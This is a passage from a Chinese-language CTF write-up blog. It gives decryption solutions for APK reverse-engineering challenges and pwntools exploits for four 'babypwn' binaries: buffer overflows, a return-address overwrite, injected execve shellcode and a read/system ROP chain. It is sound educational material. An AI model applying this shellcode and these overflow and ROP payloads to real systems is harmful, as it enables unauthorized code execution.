 return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>改为,这样自己不会掉血<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">int subkkkkkkkkkkkkkkkkkkkkkk_412010()</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line"></div><div class="line">  if ( hp &gt; 0 )</div><div class="line">  &#123;</div><div class="line">    result = boss_hp - atk;</div><div class="line">    boss_hp -= atk;</div><div class="line">  &#125;</div><div class="line">  if ( hp &lt;= 0 )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;you are die!!\n&quot;);</div><div class="line">    exit(0);</div><div class="line">  &#125;</div><div class="line">  if ( boss_hp &lt;= 0 )</div><div class="line">    result = next_boss_sub_41100F();</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>然后，慢慢，把每一层都修改，最后一层因为调用自杀函数，这里直接nop掉，最后修改保存，得到flag<br>flag : flag{I_1ike_hard_w0rk_484_RE_and_never_up}</p>
<h2 id="apk1"><a href="#apk1" class="headerlink" title="apk1"></a>apk1</h2><p>用工具apk_to_java.jar打开，发现是一个re4加密<br>放在java里运行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encode</span><span class="params">(String aInput, String aKey)</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span> i;</div><div class="line">        <span class="keyword">int</span>[] iS = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</div><div class="line">        <span class="keyword">byte</span>[] iK = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">256</span>];</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</div><div class="line">            iS[i] = i;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> i2 = (<span class="keyword">short</span>) <span class="number">0</span>; i2 &lt; (<span class="keyword">short</span>) <span class="number">256</span>; i2 = (<span class="keyword">short</span>) (i2 + <span class="number">1</span>)) &#123;</div><div class="line">            iK[i2] = (<span class="keyword">byte</span>) aKey.charAt(i2 % aKey.length());</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++) &#123;</div><div class="line">            j = ((iS[i] + j) + iK[i]) % <span class="number">256</span>;</div><div class="line">            <span class="keyword">int</span> temp = iS[i];</div><div class="line">            iS[i] = iS[j];</div><div class="line">            iS[j] = temp;</div><div class="line">        &#125;</div><div class="line">        i = <span class="number">0</span>;</div><div class="line">        j = <span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> temp;</div><div class="line">        <span class="keyword">char</span>[] iInputChar = aInput.toCharArray();</div><div class="line">        <span class="keyword">char</span>[] iOutputChar = <span class="keyword">new</span> <span class="keyword">char</span>[iInputChar.length];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> x = (<span class="keyword">short</span>) <span class="number">0</span>; x &lt; iInputChar.length; x = (<span class="keyword">short</span>) (x + <span class="number">1</span>)) &#123;</div><div class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span>;</div><div class="line">            j = (iS[i] + j) % <span class="number">256</span>;</div><div class="line">            temp = iS[i];</div><div class="line">            iS[i] = iS[j];</div><div class="line">            iS[j] = temp;</div><div class="line">            iOutputChar[x] = (<span class="keyword">char</span>) (iInputChar[x] ^ ((<span class="keyword">char</span>) iS[(iS[i] + (iS[j] % <span class="number">256</span>)) % <span class="number">256</span>]));</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(iOutputChar);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> UnsupportedEncodingException </span>&#123;</div><div class="line">	    String key = <span class="string">"PassW0rd"</span>;               </div><div class="line">	    <span class="keyword">byte</span>[] ke = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;(<span class="keyword">byte</span>) <span class="number">33</span>, (<span class="keyword">byte</span>) <span class="number">67</span>, (<span class="keyword">byte</span>) <span class="number">80</span>, (<span class="keyword">byte</span>) <span class="number">65</span>, (<span class="keyword">byte</span>) <span class="number">110</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, Byte.MIN_VALUE, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">98</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">79</span>, (<span class="keyword">byte</span>) <span class="number">76</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">127</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">67</span>, (<span class="keyword">byte</span>) <span class="number">39</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">80</span>, (<span class="keyword">byte</span>) <span class="number">90</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">99</span>, (<span class="keyword">byte</span>) <span class="number">108</span>, (<span class="keyword">byte</span>) <span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">78</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">70</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">116</span>, (<span class="keyword">byte</span>) <span class="number">2</span>, (<span class="keyword">byte</span>) <span class="number">126</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">73</span>, (<span class="keyword">byte</span>) <span class="number">13</span>, (<span class="keyword">byte</span>) <span class="number">113</span>, (<span class="keyword">byte</span>) <span class="number">73</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">82</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">114</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">120</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">79</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">67</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">92</span>, (<span class="keyword">byte</span>) <span class="number">7</span>, (<span class="keyword">byte</span>) <span class="number">115</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">121</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">86</span>, (<span class="keyword">byte</span>) <span class="number">19</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">121</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">86</span>, (<span class="keyword">byte</span>) <span class="number">10</span>, (<span class="keyword">byte</span>) <span class="number">44</span>, (<span class="keyword">byte</span>) <span class="number">77</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">76</span>&#125;;</div><div class="line">	    String l = <span class="keyword">new</span> String(ke);  	  </div><div class="line">	    System.out.println(encode(l,key));    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最后没有想到的是，java的编码问题导致有些人没有解出来，有点难以接受，我用的是utf-8<br>flag : flag{Th1s_is_only_Rc4_you_Should_know_more}</p>
<h2 id="apk2"><a href="#apk2" class="headerlink" title="apk2"></a>apk2</h2><p>用工具apk_to_java.jar打开，发现是一个简单的文件加密，直接复制出来运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line">   private static byte[] md5(String data) &#123;</div><div class="line">       try &#123;</div><div class="line">           MessageDigest messageDigest = MessageDigest.getInstance(&quot;md5&quot;);</div><div class="line">           messageDigest.update(data.getBytes());</div><div class="line">           return messageDigest.digest();</div><div class="line">       &#125; catch (NoSuchAlgorithmException e) &#123;</div><div class="line">           e.printStackTrace();</div><div class="line">           return new byte[0];</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   private static byte[] encryptData(byte[] data, byte[] key) &#123;</div><div class="line">       byte keyLength = (byte) key.length;</div><div class="line">       byte[] cipherText = new byte[data.length];</div><div class="line">       for (int i = 0; i &lt; data.length; i++) &#123;</div><div class="line">           cipherText[i] = (byte) (data[i] ^ key[i % keyLength]);</div><div class="line">       &#125;</div><div class="line">       return cipherText;</div><div class="line">   &#125;</div><div class="line">   </div><div class="line">   private static String generateRandomFilename(int length) &#123;</div><div class="line">       Random random = new Random();</div><div class="line">       StringBuilder stringBuilder = new StringBuilder(length);</div><div class="line">       for (int i = 0; i &lt; length; i++) &#123;</div><div class="line">           char temp = (char) random.nextInt(62);</div><div class="line">           if (temp &lt; &apos;\u001a&apos;) &#123;</div><div class="line">               temp = (char) (temp + 97);</div><div class="line">           &#125; else if (temp &lt; &apos;4&apos;) &#123;</div><div class="line">               temp = (char) (temp + 65);</div><div class="line">           &#125; else &#123;</div><div class="line">               temp = (char) (temp + 48);</div><div class="line">           &#125;</div><div class="line">           stringBuilder.append(temp);</div><div class="line">       &#125;</div><div class="line">       System.out.println(stringBuilder.toString());</div><div class="line">       return stringBuilder.toString();</div><div class="line">      </div><div class="line">   &#125;</div><div class="line">   private static byte[] readUri(String uri) throws IOException &#123;</div><div class="line">   	File file = new File(uri);  </div><div class="line">       @SuppressWarnings(&quot;resource&quot;)</div><div class="line">	InputStream inputStream = new FileInputStream(file);</div><div class="line">       ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</div><div class="line">       byte[] buffer = new byte[1024];</div><div class="line">       while (true) &#123;</div><div class="line">           int read = inputStream.read(buffer);</div><div class="line">           if (read == -1) &#123;</div><div class="line">               return byteArrayOutputStream.toByteArray();</div><div class="line">           &#125;</div><div class="line">           byteArrayOutputStream.write(buffer, 0, read);</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   private static void decode(byte[] cipherText) throws IOException &#123;</div><div class="line">   </div><div class="line">   	</div><div class="line">   	File outputFile = new File(&quot;F:/CTF/timu/期末/RE/apk2/flag1&quot;);</div><div class="line">          try &#123;</div><div class="line">              FileOutputStream fileOutputStream = new FileOutputStream(outputFile);</div><div class="line">              fileOutputStream.write(cipherText);</div><div class="line">              fileOutputStream.close();</div><div class="line">          &#125;catch (Exception e) &#123;</div><div class="line">		// TODO: handle exception</div><div class="line">	&#125;</div><div class="line">          System.out.println(&quot;done&quot;);</div><div class="line">  </div><div class="line"></div><div class="line">   &#125;</div><div class="line"></div><div class="line">   </div><div class="line">   public static void main(String[] args) throws IOException &#123;</div><div class="line">   	String password = &quot;Password&quot;;</div><div class="line">   	byte[] key = md5(password);</div><div class="line">   	String path=&quot;F:/CTF/timu/期末/RE/apk2/flag.enc&quot;;</div><div class="line">   	byte[] data=readUri(path);</div><div class="line">   	byte[] data1=encryptData(data,key);</div><div class="line">   	decode(data1);</div><div class="line">   	</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>然后用010打开，发现是一个压缩包，解压得到flag<br>flag{This_easy_encrypto_t0_file<em>hi$!&gt;</em>&lt;}</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="1、babypwn1"><a href="#1、babypwn1" class="headerlink" title="1、babypwn1"></a>1、babypwn1</h2><p>程序就不放了，这里可以下载（<a href="https://betamao.me）" target="_blank" rel="external">https://betamao.me）</a><br>分析程序，检查发现程序无任何保护<br><img src="https://i.imgur.com/52gZ58m.png" alt=""><br>我们只需要v5=abcd,就可以得到shell(意味着拿到flag),但v5=233了，所以这里我们需要覆盖v5的值<br>这里第一个箭头是函数的栈顶eps=0x3f4(同时我们输入的s也是存放在这里),第二个箭头v5=0xc,所以我们算出两者的距离d=0x3f4-0xc=1000，就可以覆盖了，构造payload(小端序，v5是int型的)：<br><code>payload = &#39;a&#39;*1000+&#39;dcba&#39;</code><br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">'./babypwn1'</span>)</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">1000</span>+<span class="string">'dcba'</span></div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<h2 id="2、babypwn2"><a href="#2、babypwn2" class="headerlink" title="2、babypwn2"></a>2、babypwn2</h2><p>分析程序，检查发现程序无任何保护<br>发现这个函数，同时发现getShell函数<br><img src="https://i.imgur.com/WyLpecF.png" alt=""><br>那我们只有覆盖返回地址到getShell函数就好啦，发现函数栈帧0x3f4=1012,函数栈是这样的：<br><img src="https://i.imgur.com/3xoBk7P.png" alt=""><br>那么我们只需要输入1012+4+ret(getShell的地址)就成功啦<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'babypwn2'</span>)</div><div class="line">elf=ELF(<span class="string">'babypwn2'</span>)</div><div class="line">ret=elf.symbols[<span class="string">'getShell'</span>]</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">1016</span> +p32(ret)</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<h2 id="3、babypwn3"><a href="#3、babypwn3" class="headerlink" title="3、babypwn3"></a>3、babypwn3</h2><p>分析程序，检查发现程序无任何保护<br>发现存在溢出，并且当v2=127的时候，会去执行输入的代码<br><img src="https://i.imgur.com/McHlAzO.png" alt=""><br>可是这里溢出后并没有执行得到shell的函数，因为没有任何保护，所以栈上的代码可以执行。那么我们就自己写一个执行shell的代码输入就可以了——shellcode，可以在网上找，它的功能就是system(“/bin/sh”)<br>方法一<br>1、输入shellcode<br>2、覆盖v7=127<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">shellcode = <span class="string">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</span>;</div><div class="line">p=process(<span class="string">'./babypwn3'</span>)</div><div class="line">payload = shellcode+<span class="string">'a'</span>*(<span class="number">127</span>-len(shellcode))+p32(<span class="number">127</span>)</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">raw_input()</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p>方法二<br>1、存在jmp esp指令<br>2、栈溢出到jmp esp位置，执行shellcode<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">shellcode = <span class="string">"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</span>;</div><div class="line">p=process(<span class="string">'./babypwn3'</span>)</div><div class="line">jmp_esp=<span class="number">0x8048500</span></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">140</span>+p32(jmp_esp)+shellcode</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<h2 id="4、babypwn4"><a href="#4、babypwn4" class="headerlink" title="4、babypwn4"></a>4、babypwn4</h2><p>分析程序，检查发现程序只有NX保护<br>潘师傅说这道题出题有点失误，但是还是很基础的，这里我就把我当poc.py献给大家<br>测试成功poc.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = process(<span class="string">'babypwn4'</span>)</div><div class="line">elf=ELF(<span class="string">'babypwn4'</span>)</div><div class="line">bss=elf.bss()</div><div class="line">read_plt=elf.plt[<span class="string">'read'</span>]</div><div class="line">system_plt=elf.plt[<span class="string">'system'</span>]</div><div class="line">pppr=<span class="number">0x8048639</span></div><div class="line"></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">245</span> +p32(read_plt)+p32(pppr)+p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">8</span>)+p32(system_plt)+p32(<span class="number">1</span>)+p32(bss)</div><div class="line">p.recv()</div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(<span class="string">'/bin/sh'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<p>这里我要睡觉了，就不解释了。有任何问题欢迎来问</p>

      
    </div>
    
    
    

    <div>
      
        
      
    </div>
    

    

    

    <div>
     
      <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>
      
    </div>

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2017/12/05/code/" rel="next" title="代码备份">
                <i class="fa fa-chevron-left"></i> 代码备份
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2017/12/19/iptables/" rel="prev" title="Liunx下的iptables">
                Liunx下的iptables <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.png"
                alt="" />
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">34</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          <div class="links-of-author motion-element">
            
              
                <span class="links-of-author-item">
                  <a href="https://github.com/saucxs/" target="_blank" title="GitHub">
                    
                      <i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://weibo.com/" target="_blank" title="Twitter">
                    
                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://www.zhihu.com/people/ese-76-83/activities" target="_blank" title="Zhihu">
                    
                      <i class="fa fa-fw fa-drupal"></i>Zhihu</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="https://weibo.com/5899672336/profile?topnav=1&wvr=6/&is_all=1" target="_blank" title="Weibo">
                    
                      <i class="fa fa-fw fa-weibo"></i>Weibo</a>
                </span>
              
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-globe"></i>
                
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.betamao.me/" title="betamao" target="_blank">betamao</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://err0rzz.github.io/" title="err0rzz" target="_blank">err0rzz</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://veritas501.space/" title="Veritas501" target="_blank">Veritas501</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.bendawang.site/" title="Bendawang" target="_blank">Bendawang</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://lalajun.github.io/" title="lalajun" target="_blank">lalajun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://bestwing.me/" title="swing" target="_blank">swing</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://b3t4m3ee.github.io/" title="b3t4m3ee" target="_blank">b3t4m3ee</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://myblackmanba.github.io/" title="black" target="_blank">black</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.baidu.com" title="百度一下" target="_blank">百度一下</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RE"><span class="nav-number">1.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Re1"><span class="nav-number">1.1.</span> <span class="nav-text">Re1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re3"><span class="nav-number">1.2.</span> <span class="nav-text">Re3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re4"><span class="nav-number">1.3.</span> <span class="nav-text">Re4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apk1"><span class="nav-number">1.4.</span> <span class="nav-text">apk1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apk2"><span class="nav-number">1.5.</span> <span class="nav-text">apk2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">2.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、babypwn1"><span class="nav-number">2.1.</span> <span class="nav-text">1、babypwn1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、babypwn2"><span class="nav-number">2.2.</span> <span class="nav-text">2、babypwn2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3、babypwn3"><span class="nav-number">2.3.</span> <span class="nav-text">3、babypwn3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4、babypwn4"><span class="nav-number">2.4.</span> <span class="nav-text">4、babypwn4</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>

  
</div>

<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>

<span id="busuanzi_container_site_pv">
    本站总访问量<span id="busuanzi_value_site_pv"></span>次
</span>



<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">博客全站共49.5k字</span>
</div>

        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  









<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>



  





  

  

  

  
  

  

  

  

</body>
</html>

<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/love.js"></script>
